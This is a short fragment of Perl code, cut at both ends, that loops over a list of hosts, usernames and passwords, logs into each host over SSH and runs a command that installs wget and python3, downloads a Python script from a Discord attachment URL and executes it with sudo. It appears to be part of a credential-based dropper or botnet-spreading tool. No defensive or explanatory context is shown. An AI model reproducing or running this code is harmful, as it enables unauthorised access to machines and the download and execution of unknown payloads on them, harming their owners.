...
scalar(@newarray); $i+=3) {
        ...
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('sudo apt-get update -y;sudo apt-get install python3 -y;sudo apt-get install wget -y;sudo wget https://cdn.discordapp.com/attachments/533491609602359336/542246221897531395/cons.py;sudo python3 cons.py');
                        sleep 20;
                        $channel->close;
